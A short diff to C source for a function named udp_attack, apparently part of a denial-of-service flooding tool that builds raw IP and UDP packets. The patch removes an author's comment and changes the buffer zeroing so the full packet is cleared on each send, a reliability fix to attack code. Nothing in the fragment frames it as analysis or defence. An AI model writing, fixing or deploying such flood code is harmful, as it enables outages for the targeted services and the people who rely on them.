@@ -33,18 +33,15 @@ void* udp_attack(void* arg) {
     int packet_size = params->psize > 0 ? params->psize : 32;
     if (packet_size < min_packet_size) packet_size = min_packet_size;
     if (packet == NULL || last_packet_size != packet_size) {
-        // No need to free packet at the end.
-        // I did test.
-        // Incase anyone tries to note me >:(
         if (packet) free(packet);
         packet = malloc(packet_size);
         if (!packet) {
             close(udp_sock);
             return NULL;
         }
-        memset(packet, 0, min_packet_size);
         last_packet_size = packet_size;
     }
+    memset(packet, 0, packet_size);
 
     struct iphdr* iph = (struct iphdr*)packet;
     struct udphdr* udph = (struct udphdr*)(packet + sizeof(struct iphdr));
